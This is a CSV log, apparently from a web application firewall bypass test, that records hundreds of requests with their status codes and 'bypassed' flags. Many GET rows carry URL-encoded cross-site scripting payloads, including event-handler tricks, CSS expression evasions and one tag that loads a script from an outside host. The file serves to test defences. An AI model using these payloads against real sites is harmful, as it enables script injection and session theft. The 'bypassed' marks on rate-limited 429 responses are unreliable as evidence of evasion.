test_name,url,method,status_code,is_blocked,bypassed
xss,/?p=%3Cxmp%20onbeforecut%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforepaste%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onblur%3Dconfirm%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onbeforepaste%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onclick%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onblur%3Dprompt%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onclick%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onclick%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncontextmenu%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncopy%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncontextmenu%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncopy%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncut%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20ondblclick%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20ondblclick%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20ondblclick%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20oncut%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onfocusout%3Dprompt%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onfocusout%3Dconfirm%281%29%20tabindex%3D1%20id%3Dx%3E%3C/xmp%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeydown%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeydown%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeypress%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeypress%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeyup%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onkeyup%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousedown%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousedown%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseenter%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousedown%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseenter%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseleave%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseleave%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseenter%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseleave%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousemove%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmousemove%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cx%20onmouseup%3Dconfirm%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseout%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseout%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseout%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseover%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseover%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseover%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseup%3D%22alert%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseup%3D%22confirm%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onmouseup%3D%22prompt%281%29%22%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cx%20onafterscriptexecute%3Dprompt%281%29%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onpaste%3D%22prompt%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cxmp%20onpaste%3D%22confirm%281%29%22%20contenteditable%3Etest%3C/xmp%3E,GET,429,false,true
xss,/?p=%3Cx%20onafterscriptexecute%3Dconfirm%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onafterscriptexecute%3Dalert%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onanimationend%3Dconfirm%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%20onanimationend%3Dprompt%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%20onanimationend%3Dalert%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Da%3Dconfirm%2Ca%28domain%29%3Eclick,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Da%3Dalert%2Ca%28domain%29%3Eclick,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Dalert%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Dconfirm%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onbeforescriptexecute%3Dalert%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Da%3Dprompt%2Ca%28domain%29%3Eclick,GET,429,false,true
xss,/?p=%3Cx%20onauxclick%3Dprompt%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onclick%3Dalert%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onbeforescriptexecute%3Dprompt%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onbeforescriptexecute%3Dconfirm%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onclick%3Dconfirm%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onclick%3Dprompt%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncontextmenu%3Dalert%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncontextmenu%3Dconfirm%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncontextmenu%3Dprompt%281%29%3Eright%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncut%3Dalert%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondblclick%3Dalert%281%29%3Edouble%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncopy%3Dprompt%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncopy%3Dconfirm%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncut%3Dconfirm%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncopy%3Dalert%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20oncut%3Dprompt%281%29%3Ecopy%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondblclick%3Dprompt%281%29%3Edouble%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondblclick%3Dconfirm%281%29%3Edouble%20click%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondrag%3Dprompt%281%29%3Edrag%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondrag%3Dalert%281%29%3Edrag%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmousedown%3Dalert%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20ondrag%3Dconfirm%281%29%3Edrag%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmousedown%3Dconfirm%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseenter%3Dalert%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onmouseenter%3Dconfirm%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onmousedown%3Dprompt%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseenter%3Dprompt%281%29%3E,GET,429,false,true
xss,/?p=%3Cx%20onmousemove%3Dconfirm%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmousemove%3Dalert%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseout%3Dconfirm%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseout%3Dalert%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmousemove%3Dprompt%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseover%3Dconfirm%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseover%3Dalert%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseout%3Dprompt%281%29%3Ehover%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onmouseover%3Dprompt%281%29%3Ehover%20this%21,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3Cx%20onmouseup%3Dalert%281%29%3Eclick%20this%21,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3CXSS%20STYLE%3D%22xss%3Aexpression%28javascript%3Aalert%281%29%29%22%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3CXSS%20STYLE%3D%22xss%3Aexpression%28javascript%3Aconfirm%281%29%29%22%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3CXSS%20STYLE%3D%22xss%3Aexpression%28javascript%3Aprompt%281%29%29%22%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=/XSS%20STYLE%3Dxss%3Aexpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3C/XSS%20STYLE%3Dxss%3Aexpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%3C/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%3C~/XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%3C~/XSS%20STYLE%3Dxss%3Aexpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%3CXSS%20STYLE%3D%22xss%3Aexpression%28prompt%28%27XSS%27%29%29%22%3E,GET,429,false,true
xss,/?p=%28xss%22%3E%3C%21--%3E%3Csvg/onload%3Dalert%28document.domain%29%3E%29,GET,429,false,true
xss,/?p=XSS%20STYLE%3Dxss%3Ae/%2A%2A/xpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%28xss%22%3E%3C%21--%3E%3Csvg/onload%3Dconfirm%28document.domain%29%3E%29,GET,429,false,true
xss,/?p=XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=%28xss%22%3E%3C%21--%3E%3Csvg/onload%3Dprompt%28document.domain%29%3E%29,GET,429,false,true
xss,/?p=XSS-STYLE%3Dxss%3Ae/%2A%2A/xpression%28prompt%28%27XSS%27%29%29%3E,GET,429,false,true
xss,/?p=x%22%3C/title%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E,GET,429,false,true
xss,/?p=x%22%3C/title%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,GET,429,false,true
xss,/?p=x%22%3C/title%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E,GET,429,false,true
xss,/?p=X%3Cx%20style%3D%60behavior%3Aurl%28%23default%23time2%29%60%20onbegin%3D%60javascript%3Aalert%281%29%60%20%3E,GET,429,false,true
xss,/?p=xyz%20onerror%3Dconfirm%286%29%3B,GET,429,false,true
xss,/?p=X%3Cx%20style%3D%60behavior%3Aurl%28%23default%23time2%29%60%20onbegin%3D%60javascript%3Aprompt%281%29%60%20%3E,GET,429,false,true
xss,/?p=xyz%20onerror%3Dprompt%286%29%3B,GET,429,false,true
xss,/?p=y%3D%3Ca%3Ealert%3C/a%3E%3Bcontent%5By%5D%28123%29,GET,429,false,true
xss,/?p=X%3Cx%20style%3D%60behavior%3Aurl%28%23default%23time2%29%60%20onbegin%3D%60javascript%3Aconfirm%281%29%60%20%3E,GET,429,false,true
xss,/?p=xyz%20onerror%3Dalert%286%29%3B,GET,429,false,true
xss,/?p=y%3D%3Ca%3Econfirm%3C/a%3E%3Bcontent%5By%5D%28123%29,GET,429,false,true
xss,/?p=%3CZ%20oncut%3Dconfirm%28%29%3Ex,GET,429,false,true
xss,/?p=%3CZ%20oncut%3Dalert%28%29%3Ex,GET,429,false,true
xss,/?p=y%3D%3Ca%3Eprompt%3C/a%3E%3Bcontent%5By%5D%28123%29,GET,429,false,true
xss,/?p=%3CZ%20oncut%3Dprompt%28%29%3Ex,GET,429,false,true
xss,/,POST,429,false,true
xss,/?p=z%22%20onmouseover%3D%22prompt%28%27Hackerone%27%29%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E,GET,429,false,true
xss,/?p=z%22%20onmouseover%3D%22alert%28%27Hackerone%27%29%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E,GET,429,false,true
xss,/?p=z%22%20onmouseover%3D%22confirm%28%27Hackerone%27%29%22%20style%3D%22position%3Afixed%3Bleft%3A0%3Btop%3A0%3Bwidth%3A9999px%3Bheight%3A9999px%3B%22%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3Cx%20onmouseup%3Dprompt%281%29%3Eclick%20this%21,GET,429,false,true
xss,/?p=%3Cx%20onwebkitanimationend%3Dconfirm%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%20onwebkitanimationend%3Dalert%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert%281%29%3C/x%3Ascript%3E,GET,429,false,true
xss,/?p=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%3Econfirm%281%29%3C/x%3Ascript%3E,GET,429,false,true
xss,/?p=x%3B%3C/script%3E%3Cscript%3Enew%20class%20extends%20alert%281%29%7B%7D%3C/script%3E%20,GET,429,false,true
xss,/?p=%3Cx%20onwebkitanimationend%3Dprompt%281%29%3E%3Cstyle%3Ex%7Banimation%3As%7D%40keyframes%20s%7B%7D,GET,429,false,true
xss,/?p=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%20src%3D%22//brutelogic.com.br/1.js%22/%3E,GET,429,false,true
xss,/?p=%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%3Eprompt%281%29%3C/x%3Ascript%3E,GET,429,false,true
xss,/?p=%3CxssBypass/onpointermove%3D%28alert%29%281%29%3EMoveMouseHere,GET,429,false,true
xss,/?p=%3CxssBypass/onpointermove%3D%28confirm%29%281%29%3EMoveMouseHere,GET,429,false,true
xss,/?p=xss%3Aex/%2AXSS%2A//%2A/%2A/pression%28alert%28%22XSS%22%29%29%27%3E,GET,429,false,true
xss,/?p=%3Cxss%20class%3Dprogress-bar-animated%20onanimationstart%3Dprompt%281%29%3E,GET,429,false,true
xss,/?p=%3Cxss%20class%3Dprogress-bar-animated%20onanimationstart%3Dalert%281%29%3E,GET,429,false,true
xss,/?p=%3CxssBypass/onpointermove%3D%28prompt%29%281%29%3EMoveMouseHere,GET,429,false,true
xss,/?p=xss%3Aex/%2AXSS%2A//%2A/%2A/pression%28confirm%28%22XSS%22%29%29%27%3E,GET,429,false,true
xss,/?p=%3Cxss%20class%3Dprogress-bar-animated%20onanimationstart%3Dconfirm%281%29%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/,POST,429,false,true
xss,/,POST,429,false,true
xss,/?p=xss%3Aex/%2AXSS%2A//%2A/%2A/pression%28prompt%28%22XSS%22%29%29%27%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onactivate%3Dconfirm%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onactivate%3Dprompt%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dconfirm%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dprompt%281%29%3E%3C/xss%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dconfirm%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onblur%3Dalert%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dprompt%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
xss,/?p=%3Cxss%20id%3Dx%20tabindex%3D1%20onblur%3Dconfirm%281%29%3E%3C/xss%3E%3Cinput%20autofocus%3E,GET,429,false,true
